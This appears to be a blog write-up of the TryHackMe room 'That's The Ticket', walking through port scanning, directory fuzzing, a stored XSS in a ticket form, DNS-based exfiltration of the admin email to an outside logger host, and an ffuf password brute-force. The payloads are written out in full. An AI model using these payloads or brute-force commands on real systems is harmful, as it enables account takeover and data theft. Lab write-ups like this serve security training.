---
title: "Thats the ticket TryHackMe Writeup"
last_modified_at: 2021-06-11T11:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - web
  - xss
  - dns
  - data exfiltration
  - ffuf
  - bruteforcing
  - tryhackme
  - medium
  - thatstheticket
  - thats the ticket
  - writeup
  - walkthrough
---
<img alt="coconut" src="/assets/images/thm/thatstheticket/028a86fb934a32d2549ae4a15b603ab3.png" width="200px" height="50px">

[That's The Ticket](https://tryhackme.com/room/thatstheticket) is a medium rated room on Tryhackme by [adamtlangley](https://tryhackme.com/p/adamtlangley). DNS and XSS are combined to exfiltrate the email address from the webserver and the password for the email is bruteforced using ffuf.



<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

# Nmap Scan
## Full Port Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/thats-the-ticket$ nmap -p- -oN nmap/all-ports --min-rate 1000 -v 10.10.133.75
Nmap scan report for 10.10.133.75
Host is up (0.19s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jun 11 14:54:36 2021 -- 1 IP address (1 host up) scanned in 78.28 seconds
```

## Detail Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/thats-the-ticket$ sudo nmap -p22,80 -sC -sV -oN nmap/detaill 10.10.133.75
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-11 14:55 +0545
Nmap scan report for 10.10.133.75
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bf:c3:9c:99:2c:c4:e2:d9:20:33:d1:3c:dc:01:48:d2 (RSA)
|   256 08:20:c2:73:c7:c5:d7:a7:ef:02:09:11:fc:85:a8:e2 (ECDSA)
|_  256 1f:51:68:2b:5e:99:57:4c:b7:40:15:05:74:d0:0d:9b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.96 seconds
```

Only two ports are open. SSH is running on Port 22 and HTTP on port 80. Let us start our enumeration with HTTP Service on Port 80.

# HTTP on Port 80
![image](/assets/images/thm/thatstheticket/Pasted image 20210611150850.png)
Some sort of ticket manager is present on Port 80. With ticket manager the first thing that comes into mind is XSS, since the support on the other end is going to see the request made by us and if this webapp is vulnerable to XSS, we can execute valid javascript code on the browser of the user on the other end.

## Fuzzing using ffuf
```console
reddevil@ubuntu:~/Documents/tryhackme/thats-the-ticket$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.133.75/FUZZ -fw 1 -e .txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.133.75/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 1
________________________________________________

login                   [Status: 200, Size: 1549, Words: 416, Lines: 38]
register                [Status: 200, Size: 1774, Words: 475, Lines: 40]
```

These are two links that we already saw on the homepage earlier. Nothing more from ffuf.

## Checking /login
![image1](/assets/images/thm/thatstheticket/Pasted image 20210611151312.png)
We get a login page which asks for email address as well as password. Since, I dont know any valid credentials, I decided to manually fuzz this login to check if it throws any error message.

## Trying to login with email that does not exists
![image2](/assets/images/thm/thatstheticket/Pasted image 20210611151338.png)
- I tried to tamper the fields in different ways, but the response is always the same.
- And for invalid email it says email not recognized.


## Checking /register
![image3](/assets/images/thm/thatstheticket/Pasted image 20210611151424.png)
We can register a new account on the web server.

## Registering a user
![image4](/assets/images/thm/thatstheticket/Pasted image 20210611151518.png)
And we are forwarded to a page where we can create a ticket.
![image5](/assets/images/thm/thatstheticket/Pasted image 20210611151542.png)


## On the Tryhackme Page
![image6](/assets/images/thm/thatstheticket/Pasted image 20210611151730.png)
The hint here is that the webserver is behind the firewall and the attacker(us) and the DNS/HTTP logger is outside the firewall.
They also have an image on the tryhackme page.
![image7](/assets/images/thm/thatstheticket/Pasted image 20210611175301.png)

## HTTP/DNS logger on 10.10.10.100
![image8](/assets/images/thm/thatstheticket/Pasted image 20210611151747.png)

## After Clicking on create session
![image9](/assets/images/thm/thatstheticket/Pasted image 20210611152204.png)

This shows all the DNS queries and HTTP request incoming to the server.

## Creating a new ticket
![image10](/assets/images/thm/thatstheticket/Pasted image 20210611152258.png)
I started playing with this create ticket functionality to test whether I can get XSS on the page. Also, with XSS we need someone on the other end to visit this page. Since this is a CTF, that is simulated by a script on the backend(If this is the case).


And we are forwared to this page.
![image11](/assets/images/thm/thatstheticket/Pasted image 20210611152342.png)

## XSS
Our content is inside **\<textarea>**. So I decided to end the textarea using **\</textarea>** and we can see our alert fired up.

### Payload used
```
</textarea><script>alert(1)</script>
```


![image12](/assets/images/thm/thatstheticket/Pasted image 20210611154016.png)

## Testing if we can get anyone t**o click the link
Even though we have a XSS, we have to test whether there is someone on the other end visiting the tickets. So, I decided to test it with a **img** tag.
![image13](/assets/images/thm/thatstheticket/Pasted image 20210611154243.png)

## Checking on the DNS and HTTP logger
![image14](/assets/images/thm/thatstheticket/Pasted image 20210611154330.png)
We get 3 entries for DNS queries and a HTTP request but all from us. Since the logger is outside the firewall and the webserver is inside the firewall, the firewall is not letting the requests to go out.


## Getting information Out
I played with the DNS and XSS for a long time. But the webserver is behind a firewall so it can not connect back to us. But if there is a "localhost" in the url, it seems like it can make the request outside the firewall.


### Requesting a image without localhost on the url
![image15](/assets/images/thm/thatstheticket/Pasted image 20210611172725.png)

### Response
![image17](/assets/images/thm/thatstheticket/Pasted image 20210611172758.png)
We can see there are 3 DNS queries and a HTTP request.

### Requesting a image with localhost on the url
![image18](/assets/images/thm/thatstheticket/Pasted image 20210611172910.png)
### Response
![image19](/assets/images/thm/thatstheticket/Pasted image 20210611173019.png)
We can see this time there are 4 DNS queries and one is from the server inside the firewall.


## Extracting email address
Let us try and extract the email of the admin from the backend.
### Payload
```js
</textarea> <script>
var email_first = document.getElementById("email").innerHTML.split("@")[0];
var email_second = document.getElementById("email").innerHTML.split("@")[1];
var href = "http://localhost." + email_first + "." + email_second + ".88c61070dfc89262eeb2e6a098a6a136.log.tryhackme.tech/test";
new Image().src=href;
</script>
```

### Sending Request
![image20](/assets/images/thm/thatstheticket/Pasted image 20210611173310.png)

## Checking the response
![image21](/assets/images/thm/thatstheticket/Pasted image 20210611173335.png)
We get a response and with the response we get the email of the admin.

## Bruteforcing password using ffuf
```console
reddevil@ubuntu:~/Documents/tryhackme/misguided_ghosts/http$ ffuf -w /usr/share/wordlists/rockyou.txt  -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.133.75/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.133.75/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=adminaccount@itsupport.thm&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 475
________________________________________________

******                [Status: 302, Size: 0, Words: 1, Lines: 1]
```
The password for the admin user is instantly found from rockyou.txt.

## Logging with obtained creds
![image22](/assets/images/thm/thatstheticket/Pasted image 20210611174228.png)

## Reading the flag
In the first ticket, we can flag for the challenge.
![image24](/assets/images/thm/thatstheticket/Pasted image 20210611174309.png)
